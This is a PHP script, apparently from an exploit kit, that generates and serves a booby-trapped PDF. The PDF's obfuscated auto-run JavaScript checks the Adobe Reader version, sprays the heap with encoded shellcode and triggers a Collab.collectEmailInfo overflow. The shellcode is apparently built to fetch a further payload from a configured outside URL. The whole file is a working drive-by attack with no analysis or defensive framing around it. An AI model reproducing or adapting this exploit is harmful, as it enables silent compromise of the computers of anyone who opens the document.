<?php

	error_reporting(0);

	@include("config.php");

	$id = intval($_GET['id']);
	if (empty($id)) die;

	function get_random_string( $len ) 
	{
		$result = "";
		$nums = "1234567890";
		$syms = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		$sux = $nums.$syms;
		
		for ($i = 0; $i <= $len; $i++ )
		{
			$num = rand( 0, strlen( $sux ) - 1 );
			$result .= $sux[ $num ];
		}
		
		return $syms[ rand(0,strlen( $syms ) - 1 ) ].$result;
	}

	function unescape($s){
		$out = "";
		$res=strtoupper(bin2hex($s));
		$g = round(strlen($res)/4);
		if ($g != (strlen($res)/4)) $res.="00";
		for ($i=0; $i<strlen($res);$i+=4)
			$out.="%u".substr($res,$i+2,2).substr($res,$i,2);
		return $out;
	}

	$name = get_random_string(rand(3,12));

	$pdf  = "\x25\x50\x44\x46\x2D\x31\x2E\x33\x0A\x25\xE2\xE3\xCF\xD3\x0A\x31";
	$pdf .= "\x20\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F\x4F\x70\x65\x6E\x41\x63";
	$pdf .= "\x74\x69\x6F\x6E\x20\x3C\x3C\x2F\x4A\x53\x20\x28\x74\x68\x69\x73";
	$pdf .= "\x2E\x4E\x65\x77\x5F\x53\x63\x72\x69\x70\x74\x5C\x28\x5C\x29\x29";
	$pdf .= "\x0A\x2F\x53\x20\x2F\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x0A";
	$pdf .= "\x3E\x3E\x0A\x2F\x54\x68\x72\x65\x61\x64\x73\x20\x32\x20\x30\x20";
	$pdf .= "\x52\x0A\x2F\x4F\x75\x74\x6C\x69\x6E\x65\x73\x20\x33\x20\x30\x20";
	$pdf .= "\x52\x0A\x2F\x50\x61\x67\x65\x73\x20\x34\x20\x30\x20\x52\x0A\x2F";
	$pdf .= "\x56\x69\x65\x77\x65\x72\x50\x72\x65\x66\x65\x72\x65\x6E\x63\x65";
	$pdf .= "\x73\x20\x3C\x3C\x2F\x50\x61\x67\x65\x44\x69\x72\x65\x63\x74\x69";
	$pdf .= "\x6F\x6E\x20\x2F\x4C\x32\x52\x0A\x3E\x3E\x0A\x2F\x50\x61\x67\x65";
	$pdf .= "\x4C\x61\x79\x6F\x75\x74\x20\x2F\x53\x69\x6E\x67\x6C\x65\x50\x61";
	$pdf .= "\x67\x65\x0A\x2F\x41\x63\x72\x6F\x46\x6F\x72\x6D\x20\x35\x20\x30";
	$pdf .= "\x20\x52\x0A\x2F\x44\x65\x73\x74\x73\x20\x36\x20\x30\x20\x52\x0A";
	$pdf .= "\x2F\x4E\x61\x6D\x65\x73\x20\x37\x20\x30\x20\x52\x0A\x2F\x54\x79";
	$pdf .= "\x70\x65\x20\x2F\x43\x61\x74\x61\x6C\x6F\x67\x0A\x3E\x3E\x0A\x65";
	$pdf .= "\x6E\x64\x6F\x62\x6A\x0A\x32\x20\x30\x20\x6F\x62\x6A\x0A\x5B\x5D";
	$pdf .= "\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x33\x20\x30\x20\x6F\x62\x6A\x0A";
	$pdf .= "\x3C\x3C\x2F\x54\x79\x70\x65\x20\x2F\x4F\x75\x74\x6C\x69\x6E\x65";
	$pdf .= "\x73\x0A\x2F\x43\x6F\x75\x6E\x74\x20\x30\x0A\x3E\x3E\x0A\x65\x6E";
	$pdf .= "\x64\x6F\x62\x6A\x0A\x34\x20\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F";
	$pdf .= "\x52\x65\x73\x6F\x75\x72\x63\x65\x73\x20\x38\x20\x30\x20\x52\x0A";
	$pdf .= "\x2F\x4B\x69\x64\x73\x20\x5B\x39\x20\x30\x20\x52\x5D\x0A\x2F\x54";
	$pdf .= "\x79\x70\x65\x20\x2F\x50\x61\x67\x65\x73\x0A\x2F\x43\x6F\x75\x6E";
	$pdf .= "\x74\x20\x31\x0A\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x35\x20";
	$pdf .= "\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F\x46\x69\x65\x6C\x64\x73\x20";
	$pdf .= "\x5B\x5D\x0A\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x36\x20\x30";
	$pdf .= "\x20\x6F\x62\x6A\x0A\x3C\x3C\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A";
	$pdf .= "\x0A\x37\x20\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F\x4A\x61\x76\x61";
	$pdf .= "\x53\x63\x72\x69\x70\x74\x20\x31\x30\x20\x30\x20\x52\x0A\x3E\x3E";
	$pdf .= "\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x38\x20\x30\x20\x6F\x62\x6A\x0A";
	$pdf .= "\x3C\x3C\x2F\x50\x72\x6F\x63\x53\x65\x74\x20\x5B\x2F\x50\x44\x46";
	$pdf .= "\x20\x2F\x54\x65\x78\x74\x20\x2F\x49\x6D\x61\x67\x65\x42\x20\x2F";
	$pdf .= "\x49\x6D\x61\x67\x65\x43\x20\x2F\x49\x6D\x61\x67\x65\x49\x5D\x0A";
	$pdf .= "\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x39\x20\x30\x20\x6F\x62";
	$pdf .= "\x6A\x0A\x3C\x3C\x2F\x52\x6F\x74\x61\x74\x65\x20\x30\x0A\x2F\x50";
	$pdf .= "\x61\x72\x65\x6E\x74\x20\x34\x20\x30\x20\x52\x0A\x2F\x4D\x65\x64";
	$pdf .= "\x69\x61\x42\x6F\x78\x20\x5B\x30\x20\x30\x20\x35\x39\x35\x2E\x32";
	$pdf .= "\x38\x30\x30\x30\x20\x38\x34\x31\x2E\x38\x39\x30\x30\x30\x5D\x0A";
	$pdf .= "\x2F\x54\x72\x69\x6D\x42\x6F\x78\x20\x5B\x30\x20\x30\x20\x35\x39";
	$pdf .= "\x35\x2E\x32\x38\x30\x30\x30\x20\x38\x34\x31\x2E\x38\x39\x30\x30";
	$pdf .= "\x30\x5D\x0A\x2F\x52\x65\x73\x6F\x75\x72\x63\x65\x73\x20\x38\x20";
	$pdf .= "\x30\x20\x52\x0A\x2F\x54\x79\x70\x65\x20\x2F\x50\x61\x67\x65\x0A";
	$pdf .= "\x2F\x43\x6F\x6E\x74\x65\x6E\x74\x73\x20\x31\x31\x20\x30\x20\x52";
	$pdf .= "\x0A\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x31\x30\x20\x30\x20";
	$pdf .= "\x6F\x62\x6A\x0A\x3C\x3C\x2F\x4E\x61\x6D\x65\x73\x20\x5B\x28\x4E";
	$pdf .= "\x65\x77\x5F\x53\x63\x72\x69\x70\x74\x29\x20\x31\x32\x20\x30\x20";
	$pdf .= "\x52\x5D\x0A\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x31\x31\x20";
	$pdf .= "\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F\x46\x69\x6C\x74\x65\x72\x20";
	$pdf .= "\x2F\x46\x6C\x61\x74\x65\x44\x65\x63\x6F\x64\x65\x0A\x2F\x4C\x65";
	$pdf .= "\x6E\x67\x74\x68\x20\x33\x36\x0A\x3E\x3E\x0A\x73\x74\x72\x65\x61";
	$pdf .= "\x6D\x0A\x78\x9C\x33\x50\x30\x50\x30\xB5\x34\xD5\x33\xB2\x30\x30";
	$pdf .= "\x30\x50\xB0\x30\x31\xD4\xB3\xB0\x04\xB1\x8A\x52\x15\xC2\x15\xF2";
	$pdf .= "\xB8\x00\x5F\x88\x06\x5E\x0A\x65\x6E\x64\x73\x74\x72\x65\x61\x6D";
	$pdf .= "\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x31\x33\x20\x30\x20\x6F\x62\x6A";
	$pdf .= "\x0A\x3C\x3C\x2F\x46\x69\x6C\x74\x65\x72\x20\x2F\x46\x6C\x61\x74";
	$pdf .= "\x65\x44\x65\x63\x6F\x64\x65\x0A\x2F\x4C\x65\x6E\x67\x74\x68\x20";
	$pdf .= "\x39\x39\x37\x0A\x3E\x3E\x0A\x73\x74\x72\x65\x61\x6D\x0A";

	$script = gzcompress('
	function '.$name.'() { 

		var DDpNVDfX = new Array(); 
		function kzV0IivL(rqYY0o0m, N1tTAUIH) { 
			while (rqYY0o0m.length*2<N1tTAUIH) { rqYY0o0m += rqYY0o0m; } 
			rqYY0o0m = rqYY0o0m.substring(0,N1tTAUIH/2); return rqYY0o0m; 
		}
		function S3GBCRNU() { 
			var ecBcfdoM = 0x0c0c0c0c; 
			var brIW1yTY = unescape("'.
			unescape(
				"\x43\x43\x43\x43\x43\x43\xEB\x0F\x5B\x33\xC9\x66\xB9\x80\x01\x80".
				"\x33\xEF\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF\x7F\x8B\x4E\xDF".
				"\xEF\xEF\xEF\x64\xAF\xE3\x64\x9F\xF3\x42\x64\x9F\xE7\x6E\x03\xEF".
				"\xEB\xEF\xEF\x64\x03\xB9\x87\x61\xA1\xE1\x03\x07\x11\xEF\xEF\xEF".
				"\x66\xAA\xEB\xB9\x87\x77\x11\x65\xE1\x07\x1F\xEF\xEF\xEF\x66\xAA".
				"\xE7\xB9\x87\xCA\x5F\x10\x2D\x07\x0D\xEF\xEF\xEF\x66\xAA\xE3\xB9".
				"\x87\x00\x21\x0F\x8F\x07\x3B\xEF\xEF\xEF\x66\xAA\xFF\xB9\x87\x2E".
				"\x96\x0A\x57\x07\x29\xEF\xEF\xEF\x66\xAA\xFB\xAF\x6F\xD7\x2C\x9A".
				"\x15\x66\xAA\xF7\x06\xE8\xEE\xEF\xEF\xB1\x66\x9A\xCB\x64\xAA\xEB".
				"\x85\xEE\xB6\x64\xBA\xF7\xB9\x07\x64\xEF\xEF\xEF\xBF\x87\xD9\xF5".
				"\xC0\x9F\x07\x78\xEF\xEF\xEF\x66\xAA\xF3\x64\x2A\x6C\x2F\xBF\x66".
				"\xAA\xCF\x87\x10\xEF\xEF\xEF\xBF\x64\xAA\xFB\x85\xED\xB6\x64\xBA".
				"\xF7\x07\x8E\xEF\xEF\xEF\xEC\xAA\xCF\x28\xEF\xB3\x91\xC1\x8A\x28".
				"\xAF\xEB\x97\x8A\xEF\xEF\x10\x9A\xCF\x64\xAA\xE3\x85\xEE\xB6\x64".
				"\xBA\xF7\x07\xAF\xEF\xEF\xEF\x85\xE8\xB7\xEC\xAA\xCB\xDC\x34\xBC".
				"\xBC\x10\x9A\xCF\xBF\xBC\x64\xAA\xF3\x85\xEA\xB6\x64\xBA\xF7\x07".
				"\xCC\xEF\xEF\xEF\x85\xEF\x10\x9A\xCF\x64\xAA\xE7\x85\xED\xB6\x64".
				"\xBA\xF7\x07\xFF\xEF\xEF\xEF\x85\x10\x64\xAA\xFF\x85\xEE\xB6\x64".
				"\xBA\xF7\x07\xEF\xEF\xEF\xEF\xAE\xB4\xBD\xEC\x0E\xEC\x0E\xEC\x0E".
				"\xEC\x0E\x6C\x03\xEB\xB5\xBC\x64\x35\x0D\x18\xBD\x10\x0F\xBA\x64".
				"\x03\x64\x92\xE7\x64\xB2\xE3\xB9\x64\x9C\xD3\x64\x9B\xF1\x97\xEC".
				"\x1C\xB9\x64\x99\xCF\xEC\x1C\xDC\x26\xA6\xAE\x42\xEC\x2C\xB9\xDC".
				"\x19\xE0\x51\xFF\xD5\x1D\x9B\xE7\x2E\x21\xE2\xEC\x1D\xAF\x04\x1E".
				"\xD4\x11\xB1\x9A\x0A\xB5\x64\x04\x64\xB5\xCB\xEC\x32\x89\x64\xE3".
				"\xA4\x64\xB5\xF3\xEC\x32\x64\xEB\x64\xEC\x2A\xB1\xB2\x2D\xE7\xEF".
				"\x07\x1B\x11\x10\x10\xBA\xBD\xA3\xA2\xA0\xA1\xEF".
				$URL."?id=".$id."&spl=4").'");

			var VWAbzxUP = 0x400000; var WCoEYFdo = brIW1yTY.length * 2;
			var N1tTAUIH = VWAbzxUP - (WCoEYFdo+0x38);
			var rqYY0o0m = unescape("%u9090%u9090");
			rqYY0o0m = kzV0IivL(rqYY0o0m, N1tTAUIH);
			var jpwZA7Ef = (ecBcfdoM - 0x400000)/VWAbzxUP;
			
			for (var xEzYibKs=0;xEzYibKs<jpwZA7Ef;xEzYibKs++) { 
				DDpNVDfX[xEzYibKs] = rqYY0o0m + brIW1yTY;
			} 
		}

		function Qy9QDRgu() {
			var FPUkcU5N = app.viewerVersion.toString();
			FPUkcU5N = FPUkcU5N.replace(/\D/g,"");
			var WlHmRwck = new Array( FPUkcU5N.charAt(0), FPUkcU5N.charAt(1), FPUkcU5N.charAt(2));
			if ((WlHmRwck[0] == 8 &&
			((WlHmRwck[1] == 1 && WlHmRwck[2] < 2) || WlHmRwck[1] < 1)) || 
			(WlHmRwck[0] == 7 && WlHmRwck[1] < 1) || 
			(WlHmRwck[0] < 7)) {
				S3GBCRNU();
				var YTDNPHwC = unescape("%u0c0c%u0c0c");
				while(YTDNPHwC.length < 44952) YTDNPHwC += YTDNPHwC;
				this.collabStore = Collab.collectEmailInfo({subj: "",msg: YTDNPHwC});
			} 
		}
		Qy9QDRgu();
	}');
	$len = strlen($script);
	$pdf .= $script;

	$pdf .= "\x0A\x65\x6E\x64\x73\x74\x72\x65\x61\x6D\x0A\x65\x6E\x64\x6F\x62";
	$pdf .= "\x6A\x0A\x31\x32\x20\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F\x4A\x53";
	$pdf .= "\x20\x31\x33\x20\x30\x20\x52\x0A\x2F\x53\x20\x2F\x4A\x61\x76\x61";
	$pdf .= "\x53\x63\x72\x69\x70\x74\x0A\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A";
	$pdf .= "\x0A\x31\x34\x20\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x2F\x43\x72\x65";
	$pdf .= "\x61\x74\x6F\x72\x20\x28\x53\x63\x72\x69\x62\x75\x73\x20\x31\x2E";
	$pdf .= "\x33\x2E\x33\x2E\x31\x32\x29\x0A\x2F\x54\x69\x74\x6C\x65\x20\x3C";
	$pdf .= "\x3E\x0A\x2F\x50\x72\x6F\x64\x75\x63\x65\x72\x20\x28\x53\x63\x72";
	$pdf .= "\x69\x62\x75\x73\x20\x50\x44\x46\x20\x4C\x69\x62\x72\x61\x72\x79";
	$pdf .= "\x20\x31\x2E\x33\x2E\x33\x2E\x31\x32\x29\x0A\x2F\x41\x75\x74\x68";
	$pdf .= "\x6F\x72\x20\x3C\x3E\x0A\x2F\x4B\x65\x79\x77\x6F\x72\x64\x73\x20";
	$pdf .= "\x3C\x3E\x0A\x2F\x54\x72\x61\x70\x70\x65\x64\x20\x2F\x46\x61\x6C";
	$pdf .= "\x73\x65\x0A\x2F\x4D\x6F\x64\x44\x61\x74\x65\x20\x28\x44\x3A\x32";
	$pdf .= "\x30\x30\x38\x30\x38\x30\x36\x30\x31\x34\x32\x32\x37\x29\x0A\x2F";
	$pdf .= "\x43\x72\x65\x61\x74\x69\x6F\x6E\x44\x61\x74\x65\x20\x28\x44\x3A";
	$pdf .= "\x32\x30\x30\x38\x30\x38\x30\x36\x30\x31\x34\x32\x32\x37\x29\x0A";
	$pdf .= "\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A\x0A\x78\x72\x65\x66\x0A\x30";
	$pdf .= "\x20\x31\x35\x0A\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x36";
	$pdf .= "\x35\x35\x33\x35\x20\x66\x20\x0A\x30\x30\x30\x30\x30\x30\x30\x30";
	$pdf .= "\x31\x35\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30";
	$pdf .= "\x30\x30\x30\x32\x36\x32\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A";
	$pdf .= "\x30\x30\x30\x30\x30\x30\x30\x32\x38\x30\x20\x30\x30\x30\x30\x30";
	$pdf .= "\x20\x6E\x20\x0A\x30\x30\x30\x30\x30\x30\x30\x33\x32\x35\x20\x30";
	$pdf .= "\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30\x30\x30\x30\x33";
	$pdf .= "\x39\x38\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30";
	$pdf .= "\x30\x30\x30\x34\x32\x39\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A";
	$pdf .= "\x30\x30\x30\x30\x30\x30\x30\x34\x34\x39\x20\x30\x30\x30\x30\x30";
	$pdf .= "\x20\x6E\x20\x0A\x30\x30\x30\x30\x30\x30\x30\x34\x38\x38\x20\x30";
	$pdf .= "\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30\x30\x30\x30\x35";
	$pdf .= "\x35\x34\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30";
	$pdf .= "\x30\x30\x30\x37\x31\x35\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A";
	$pdf .= "\x30\x30\x30\x30\x30\x30\x30\x37\x36\x35\x20\x30\x30\x30\x30\x30";
	$pdf .= "\x20\x6E\x20\x0A\x30\x30\x30\x30\x30\x30\x31\x39\x34\x31\x20\x30";
	$pdf .= "\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30\x30\x30\x30\x38";
	$pdf .= "\x37\x32\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A\x30\x30\x30\x30";
	$pdf .= "\x30\x30\x31\x39\x38\x38\x20\x30\x30\x30\x30\x30\x20\x6E\x20\x0A";
	$pdf .= "\x74\x72\x61\x69\x6C\x65\x72\x0A\x3C\x3C\x2F\x49\x6E\x66\x6F\x20";
	$pdf .= "\x31\x34\x20\x30\x20\x52\x0A\x2F\x52\x6F\x6F\x74\x20\x31\x20\x30";
	$pdf .= "\x20\x52\x0A\x2F\x53\x69\x7A\x65\x20\x31\x35\x0A\x3E\x3E\x0A\x73";
	$pdf .= "\x74\x61\x72\x74\x78\x72\x65\x66\x0A\x32\x31\x38\x39\x0A\x25\x25";
	$pdf .= "\x45\x4F\x46\x0A";

	$pdf = str_replace("Length 997","Length ".$len,$pdf);
	$pdf = str_replace("this.New_Script","this.".$name,$pdf);

	header("Accept-Ranges: bytes\r\n");
	header("Content-Length: ".strlen($pdf)."\r\n");
	header("Content-Disposition: inline; filename=1.pdf");
	header("\r\n");
	header("Content-Type: application/pdf\r\n\r\n");
	die($pdf);
?>